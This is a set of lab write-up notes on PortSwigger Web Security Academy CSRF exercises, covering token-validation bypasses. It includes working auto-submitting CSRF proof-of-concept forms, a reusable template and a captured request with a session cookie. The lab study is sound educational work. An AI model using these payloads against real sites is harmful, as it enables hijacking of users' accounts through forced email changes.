## CSRF vulnerability with no defenses
- POST request to /my-account/change-email does not have any CSRF protections. 
- We utilize Burp Suite to generate a CSRF PoC to use on our exploit server to solve the lab. 
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a5500bb03f12bbb808b087b0084007c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="fake&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
## CSRF where token validation depends on request method
- We note that changing email requires a CSRF token that cannot be removed or nullified in the body of the POST request.
- Let's alter the POST request from:
```
POST /my-account/change-email HTTP/2
Host: 0aa300e903e645daa8aadef600a10092.web-security-academy.net
Cookie: session=6zRITg1tqB9Eh3jTUmhYmhCv0JewZeLJ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: https://0aa300e903e645daa8aadef600a10092.web-security-academy.net
Referer: https://0aa300e903e645daa8aadef600a10092.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-Pwnfox-Color: yellow
Te: trailers

email=wiener4%40normal-user.net&csrf=wxN4HFe3P0vgWDHNar2dTT0QuGrj8yy9
```
to 

![image](https://github.com/user-attachments/assets/28a9f86f-b4be-4d4e-87b1-8e09c212a52e)

## CSRF where token validation depends on token being present
- Changing email initially includes a CSRF token in the body, but we found just removing it still allows for successful changing of email. We generated a CSRF PoC by just removing the CSRF token.

## CSRF where token is not tied to user session
- Two users are provided. We assume one as compromised and intercept the POST request to change email. Copy the CSRF token and drop the request.
- Generate a CSRF PoC with the copied CSRF token of the compromised user and use it to change the email of the second user.

## CSRF where token is tied to non-session cookie


## Miscellaneous Notes
- Basic CSRF PoC template for **CSRF vulnerability with no defenses**:
```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```
